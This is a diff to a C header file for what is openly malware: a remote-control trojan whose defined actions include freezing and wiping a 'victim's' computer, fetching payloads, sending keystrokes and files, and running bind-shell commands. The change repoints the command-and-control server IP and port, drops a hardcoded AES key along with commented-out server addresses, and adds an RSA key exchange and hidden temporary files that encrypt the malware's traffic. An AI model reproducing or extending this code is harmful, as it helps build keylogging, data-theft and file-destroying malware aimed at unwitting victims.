@@ -11,14 +11,12 @@
 #include <stdbool.h>
 #include "md5.h"
 
-#define AES_KEY "PASS_AES_KEY" // obfuscate it !!!  lol
-#define PORT 50007
-#define SERVER_IP "127.0.0.1"
-//#define SERVER_IP "20.20.20.115"
-//#define SERVER_IP "37.142.255.229"
-//#define SERVER_IP "192.186.202.137" // my goddady server
-//#define SERVER_IP "120.130.1.152" // my aws server 
 
+#define PORT 50008
+//#define SERVER_IP "127.0.0.1"
+#define SERVER_IP "20.20.20.115"
+
+#define RSA_BASE64_AES_KEY_SIZE 500
 #define MTU 1024 // maximum transformation unit
 #define HASH_LEN 34
 #define MAX_KEYSTROKE_LEN 20
@@ -26,7 +24,10 @@
 #define MAX_BIND_SHELL_COMMAND 500
 #define MAX_FILE_TO_BUFFER_COMMEND_LEN 150
 
+#define TEMP_RCVE_AES_KEY_FILE_NAME ".temp_aes_key.txt"
+#define ENCRYPTED_RECEIVED_DATA_NAME ".temp_enc_file"
 #define ENCRYPTED_TEXT_LEN(len) (int) ((len * 1.36) + 100)
+#define AES_KEY_LEN 16
 
 #define MAX_PASSWORD_LEN 16
 #define MAX_USER_NAME_LEN 32
@@ -34,6 +35,7 @@
 #define LICENSE_KEY_LENGTH 20
 
 int V_S_socket; // global value
+char AES_KEY[AES_KEY_LEN + 1];
 
 typedef enum {
 	SUCCESS,
@@ -61,6 +63,7 @@ typedef enum {
 	STUCK_VICTIMS_COMPUTER,
 	DELETE_VICTIMS_ALL_FILES,
 	GET_VICTIM_PAYLOAD,
+	KEY_EXCHANGE,
 } action_type;
 
 typedef struct {
@@ -87,6 +90,7 @@ typedef union{
 	char bind_shell_command[ENCRYPTED_TEXT_LEN(MAX_BIND_SHELL_COMMAND)];
 	char selected_victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
 	encrypted_file_transformation_protocol file_data;
+	char key_exchange_buffer[RSA_BASE64_AES_KEY_SIZE];
 } encrypted_main_data;
 
 typedef struct {
@@ -109,3 +113,4 @@ void send_file(char * file_name, action_type action, bool base64);
 void send_keystrock(char * key);
 char * encrypt_text (char * text_to_encrypt, char * encrypt_key);
 char * decrypt_text (char * text_to_decrypt, char * decryption_key);
+void secure_key_exchange();
